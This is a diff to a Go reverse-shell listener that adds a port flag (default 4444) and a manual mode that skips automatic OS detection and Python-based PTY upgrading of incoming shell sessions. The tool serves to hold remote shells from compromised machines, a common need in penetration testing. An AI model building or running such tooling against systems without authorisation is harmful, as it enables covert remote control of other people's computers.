@@ -23,11 +23,21 @@ import (
 var ctrlCChan = make(chan os.Signal, 1)
 var backgroundCommand = "rev-bg"
 var sessionHelpCommand = "rev-help"
+var (
+	port      int  = 0
+	manualPTY bool // Flag to control PTY spawning
+)
+
+func init() {
+	flag.IntVar(&port, "p", 4444, "Port to listen on")
+	flag.BoolVar(&manualPTY, "m", false, "Manual mode (skip automatic PTY)")
+	flag.Parse()
+}
 
 func main() {
 	fmt.Println("=======================================")
 	fmt.Println(" Multithreaded Reverse Shell listener  ")
-	fmt.Println(" v0.0.4                                ")
+	fmt.Println(" v0.0.5                                ")
 	fmt.Println("=======================================")
 
 	// Keyboard signal notify
@@ -37,16 +47,12 @@ func main() {
 	clients := map[int]*Socket{}
 
 	flag.Parse()
-	if flag.NFlag() == 0 && flag.NArg() == 0 {
-		fmt.Println("Usage: reverseshell-listener <port>")
-		os.Exit(1)
-	}
 
-	if _, err := strconv.Atoi(flag.Arg(0)); err != nil {
+	if port == 0 {
 		fmt.Println("[!] Port cannot be empty and not an integer")
 		os.Exit(1)
 	} else {
-		destinationPort = fmt.Sprintf(":%v", flag.Arg(0))
+		destinationPort = fmt.Sprintf(":%d", port)
 	}
 
 	fmt.Println("[+] Press Ctrl+C+Enter to quit this application")
@@ -123,29 +129,32 @@ func connectionThread(destPort string, clients map[int]*Socket) {
 		fmt.Println("[+] Got connection from <", con.RemoteAddr().String(), ">, Session ID:", sessionId)
 		socket := &Socket{sessionId: sessionId, con: con}
 
-		// Create system detector
-		detector := NewSystemDetector(con)
+		if !manualPTY {
+			// Create system detector
+			detector := NewSystemDetector(con)
 
-		// Detect OS
-		socket.osType = detector.DetectOS()
-		fmt.Println("[+] Session " + strconv.Itoa(sessionId) + " detected OS: " + socket.osType)
+			// Detect OS
+			socket.osType = detector.DetectOS()
+			fmt.Println("[+] Session " + strconv.Itoa(sessionId) + " detected OS: " + socket.osType)
 
-		// Check for Python versions if it's a Unix-like system
-		if socket.osType == "Linux" || socket.osType == "macOS" {
-			socket.pythonVersions = detector.DetectPythonVersions()
+			// Check for Python versions if it's a Unix-like system
+			if socket.osType == "Linux" || socket.osType == "macOS" {
+				socket.pythonVersions = detector.DetectPythonVersions()
 
-			if len(socket.pythonVersions) > 0 {
-				fmt.Println("[+] Checking for shell availability...")
-				availableShell := detector.DetectShell()
+				if len(socket.pythonVersions) > 0 {
+					fmt.Println("[+] Checking for shell availability...")
+					availableShell := detector.DetectShell()
 
-				if availableShell != "" {
-					detector.SpawnPTY(socket.pythonVersions, availableShell)
+					if availableShell != "" {
+						detector.SpawnPTY(socket.pythonVersions, availableShell)
+					}
 				}
 			}
+			// Reset read deadline
+			con.SetReadDeadline(time.Time{})
+		} else {
+			fmt.Println("[*] Manual mode enabled - skipping automatic execution")
 		}
-
-		// Reset read deadline
-		con.SetReadDeadline(time.Time{})
 
 		clients[sessionId] = socket
 		sessionId = sessionId + 1
